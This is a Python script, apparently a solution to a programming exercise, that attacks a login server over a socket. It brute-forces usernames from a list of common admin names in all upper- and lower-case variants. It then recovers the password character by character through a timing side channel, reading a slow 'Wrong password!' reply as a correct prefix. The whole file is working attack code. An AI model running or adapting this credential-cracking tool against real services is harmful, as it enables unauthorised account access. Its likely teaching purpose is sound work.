import json
import itertools
import socket
import sys

from datetime import datetime
from string import ascii_letters, digits


ip = sys.argv[1]
port = sys.argv[2]
client = socket.socket()
address = (ip, int(port))
client.connect(address)

logins_dictionary = (
    'admin', 'Admin', 'admin1', 'admin2', 'admin3', 'user1', 'user2', 'root', 'default', 'new_user', 'some_user',
    'new_admin', 'administrator', 'Administrator', 'superuser', 'super', 'su', 'alex', 'suser', 'rootuser',
    'adminadmin', 'useruser', 'superadmin', 'username', 'username1')

password_characters = f'{ascii_letters}{digits}'


def find_login():

    logins_up_low = (((ch,) if ch.isnumeric() else (ch.upper(), ch.lower(),) for ch in login)
                     for login
                     in logins_dictionary)

    for login in logins_up_low:

        for combi in itertools.product(*login):
            guess_login = ''.join(combi)
            log_pass = {"login": guess_login, "password": " "}
            client.send(json.dumps(log_pass, indent=4).encode())

            response = client.recv(1024).decode()
            response_dict = json.loads(response)
            if response_dict['result'] == 'Wrong login!':
                continue
            elif response_dict['result'] == 'Wrong password!':
                correct_login = guess_login

                return correct_login


def find_password(correct_login, password_start=''):

    while True:

        for char in password_characters:
            password_guess = f"{password_start}{char}"
            log_pass = {"login": correct_login, "password": password_guess}
            client.send(json.dumps(log_pass).encode())
            send_time = datetime.now()
            response = client.recv(1024)
            get_time = datetime.now()
            response = response.decode()
            time_delay = get_time - send_time
            # print(time_delay.microseconds)

            response_dict = json.loads(response)

            if response_dict['result'] == 'Connection success!':
                client.close()
                return log_pass

            elif response_dict['result'] == 'Wrong password!':
                if time_delay.microseconds > 100000:
                    password_first_part = log_pass['password']

                    return find_password(correct_login, password_start=password_first_part)


real_login = find_login()
login_password = find_password(real_login)
print(json.dumps(login_password, indent=4))
